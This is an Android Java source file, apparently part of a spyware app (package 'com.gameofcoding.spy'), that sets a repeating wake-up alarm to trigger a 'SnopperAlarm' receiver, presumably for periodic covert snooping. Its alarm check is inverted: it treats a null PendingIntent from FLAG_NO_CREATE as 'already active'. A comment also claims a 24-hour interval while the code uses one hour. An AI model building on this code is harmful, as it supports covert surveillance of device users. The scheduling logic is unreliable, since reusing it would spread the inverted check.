package com.gameofcoding.spy.spys;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import com.gameofcoding.spy.receivers.SnopperAlarm;
import com.gameofcoding.spy.utils.XLog;

public class SnopperStarter {
    private static final String TAG = "SnopperStarter";
    private Context mContext;

    public SnopperStarter(Context context) {
	mContext = context;
    }

    public void start() {
	if(mContext == null) {
	    XLog.e(TAG, "start(): Could not start alarm as passed 'Context' is null.");
	    return;
	}
        Intent intent = new Intent(mContext, SnopperAlarm.class);
        PendingIntent pendingIntent =
	    PendingIntent.getBroadcast(mContext, 0, intent, PendingIntent.FLAG_NO_CREATE);

	// Check if alarm is already running
	if (pendingIntent == null) {
	    XLog.d(TAG, "Not starting SnopperAlarm (already active)");
	    return;
	}

	// Set alarm that repeats after every 24 hours.
	// FIXME: 1 hr.  -> 12 hr. time
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
			3_600_000, pendingIntent);
    }
}
